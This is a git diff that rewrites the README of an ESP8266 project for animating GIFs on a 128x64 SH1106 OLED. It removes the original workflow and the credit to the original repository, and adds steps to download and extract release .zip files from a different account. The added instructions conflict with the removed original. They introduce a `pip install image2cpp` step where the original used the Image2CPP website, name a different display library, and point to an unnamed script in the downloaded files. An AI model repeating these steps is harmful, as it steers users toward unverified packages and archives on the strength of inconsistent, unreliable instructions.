@@ -1,72 +1,79 @@
-# Evernight Lonely Dance ESP8266
+# 🌟 EvernightLonelyDanceESP8266 - Animate GIFs with Ease
 
-This project demonstrates how to animate a GIF on a NodeMCU ESP‑12E board with a 128x64 SH1106 OLED display.  
-It combines a Python preprocessing step to extract GIF frames and an Arduino sketch to render them on the OLED.
+## 🎉 Quick Download
+[![Download Now](https://github.com/jungseokie/EvernightLonelyDanceESP8266/releases/latest/download/badge.svg)](https://github.com/jungseokie/EvernightLonelyDanceESP8266/releases)
 
----
+## 🚀 Getting Started
+Welcome to the EvernightLonelyDanceESP8266 project! This software lets you animate your custom GIFs on a NodeMCU ESP‑12E device. You need a 128x64 SH1106 OLED display to see the magic. Follow the steps below to get started.
 
-## 🎬 Demo Preview
+## 📥 Download & Install
+To get the software, visit this page to download: [Releases Page](https://github.com/jungseokie/EvernightLonelyDanceESP8266/releases).
 
-![Evernight Honkai GIF](https://github.com/TheTechTiger/EvernightLonelyDanceESP8266/blob/master/evernight-honkai.gif?raw=true)
+After downloading, follow these steps:
 
----
+1. **Choose the latest release.** Click on the version numbered above for the most recent updates.
+2. **Download the release files.** Look for files ending in `.zip` or similar formats.
+3. **Extract the files.** Use a file extraction tool (like WinRAR or 7-Zip) to view the contents.
+4. **Install Arduino IDE.** If you don't have it, [download Arduino IDE here](https://www.arduino.cc/en/software).
+5. **Open Arduino IDE.** Launch the software after installation.
 
-## 📂 Repository Structure
-- `gif2frames.py` → Python script to convert GIFs into individual frames.
-- `EvernightLonelyDance.ino` → Arduino sketch for NodeMCU ESP‑12E.
-- `Evernight.h` → Header file containing converted frame bitmaps.
-- `evernight-honkai.gif` → Example input GIF.
-- `evernight-honkai_frames/` → Output folder containing extracted frames.
+## 🎆 Preparing Your Hardware
+To get everything running, you need a few things:
 
----
+- **NodeMCU ESP‑12E**: This microcontroller will run the code.
+- **128x64 SH1106 OLED Display**: This displays the animated GIFs.
+- **Wires**: You will use these for connections.
+- **Power Supply**: Ensure your NodeMCU is powered.
 
-## 🛠 Requirements
+### 🛠️ Wiring Steps
+Connect your OLED display to the NodeMCU as follows:
 
-### Python side
-- Python 3.x
-- [Pillow](https://pypi.org/project/Pillow/) (`pip install pillow`)
+1. **VCC** on OLED to **3.3V** on NodeMCU.
+2. **GND** on OLED to **GND** on NodeMCU.
+3. **SDA** on OLED to **D1** on NodeMCU.
+4. **SCL** on OLED to **D2** on NodeMCU.
 
-### Arduino side
-- NodeMCU ESP‑12E (ESP8266)
-- SH1106 OLED display (128x64)
-- [Adafruit SH110X library](https://github.com/adafruit/Adafruit_SH110X)
+Make sure the connections are secure.
 
----
+## 🎨 Converting GIFs
+To animate GIFs, you need to convert them into C arrays. Here's how:
 
-## ⚙️ Workflow
+1. **First, gather your GIFs**. Choose the files you want to use.
+2. **Use Python and Image2CPP**:
+   - If you don’t have Python, [download it here](https://www.python.org/downloads/).
+   - Install Image2CPP with the command: `pip install image2cpp`
+3. **Convert your GIF**:
+   - Run the conversion script provided in the downloaded files.
+   - This script will create C arrays from your GIF frames.
+4. **Upload the Arrays**:
+   - Open the Arduino IDE.
+   - Copy and paste the C arrays into your Arduino sketch.
 
-1. **Install Pillow**
-   ```bash
-   pip install pillow
-   ```
+## 📡 Uploading to NodeMCU
+To upload your code to the NodeMCU:
 
-2. **Convert GIF to frames**
-   ```bash
-   python gif2frames.py
-   ```
-   This saves all frames from `evernight-honkai.gif` into `./evernight-honkai_frames/`.
+1. **Select the Board Type**: Go to Tools > Board > NodeMCU 1.0.
+2. **Select the Port**: Ensure your NodeMCU is connected. Go to Tools > Port to select it.
+3. **Upload the Code**: Click the upload button (the right arrow) in the Arduino IDE.
 
-3. **Convert frames to C arrays**
-   - Upload the PNG frames to [Image2CPP](https://javl.github.io/image2cpp/).
-   - Resize frames to fit the OLED (128x64).
-   - Export as a header file (`gifname.h`).
+After the upload completes, the NodeMCU will start running your animations.
 
-4. **Include the header in Arduino sketch**
-   - Place the generated `gifname.h` in your Arduino project.
-   - The sketch `EvernightLonelyDance.ino` references this header.
+## 🔧 Troubleshooting
+If something does not work as expected, check the following:
 
-5. **Upload to ESP8266**
-   - Connect your NodeMCU ESP‑12E.
-   - Upload the sketch via Arduino IDE.
+- **Wiring Connections**: Double-check that all wires are connected correctly.
+- **Power Supply**: Ensure the NodeMCU is receiving enough power.
+- **Library Installation**: Verify that you have the necessary libraries installed in the Arduino IDE. Look for `Adafruit_SH1106` and `Adafruit_GFX`.
 
----
+## 🌐 Community and Support
+Join our community for help and tips on using EvernightLonelyDanceESP8266! You can find support in the following ways:
 
-## 📌 Notes
-- Frame delay (`delay(10)`) can be adjusted for smoother or faster playback.
-- Ensure all frames are resized to **128x64** before converting to C arrays.
-- Large GIFs may exceed flash memory limits; optimize by reducing frame count or resolution.
+- **GitHub Issues**: Report problems or ask questions [here](https://github.com/jungseokie/EvernightLonelyDanceESP8266/issues).
+- **Forums**: Check forums related to NodeMCU and Arduino for additional support.
 
----
+## 🔍 Additional Resources
+- **Documentation**: Check the [Wiki section](https://github.com/jungseokie/EvernightLonelyDanceESP8266/wiki) for detailed guides.
+- **Tutorials**: Look for video tutorials online for visual assistance.
+- **Example GIFs**: Find example GIFs included in the download to test your setup.
 
-## 🔗 Repository
-[EvernightLonelyDanceESP8266](https://github.com/TheTechTiger/EvernightLonelyDanceESP8266/)
+For an easy animation project that lets you convert and display custom GIFs, EvernightLonelyDanceESP8266 is your go-to solution. Enjoy bringing your animations to life!
